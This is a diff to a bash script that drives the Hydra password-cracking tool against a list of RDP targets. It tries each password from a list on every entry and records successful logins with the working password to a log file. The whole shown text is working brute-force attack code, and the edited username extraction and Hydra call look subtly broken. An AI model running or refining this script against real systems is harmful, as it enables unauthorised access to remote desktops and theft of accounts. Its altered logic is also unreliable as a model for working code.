@@ -14,7 +14,7 @@ fi
 # Create or clear the success log file
 > "$success_log_file"
 
-# Read all IP:username pairs into an array
+# Read all RDP entries into an array
 mapfile -t iplog_entries < "$iplog_file"
 
 # Read all passwords into an array
@@ -51,19 +51,15 @@ for password in "${passwords[@]}"; do
 
     # Loop through each RDP entry in iplog.txt
     for entry in "${iplog_entries[@]}"; do
-        IFS=: read -r full_url target_name <<< "$entry"
-
-        # Ensure the full_url and target_name are not empty
-        if [[ -z "$full_url" || -z "$target_name" ]]; then continue; fi
-
-        # Ensure the full_url is in the correct format
-        if [[ ! "$full_url" =~ ^rdp:// ]]; then
-            full_url="rdp://$full_url"
+        # Use the entry directly without modification
+        if [[ -z "$entry" ]]; then
+            echo "Invalid entry in iplog: '$entry', skipping..."
+            continue
         fi
 
         # Run Hydra for each username and password pair, capturing output
-        if sudo hydra -l "$target_name" -p "$password" "$full_url" -t 4 -W 3 | grep -q "login successful"; then
-            echo "Successful login with $target_name on $full_url using password: $password" >> "$success_log_file"
+        if sudo hydra -l "${entry#rdp://*}" -p "$password" "$entry" rdp -t 4 -W 3 | grep -q "login successful"; then
+            echo "Successful login with ${entry#rdp://*} on $entry using password: $password" >> "$success_log_file"
             successful_attempts=$((successful_attempts + 1))
         fi
 
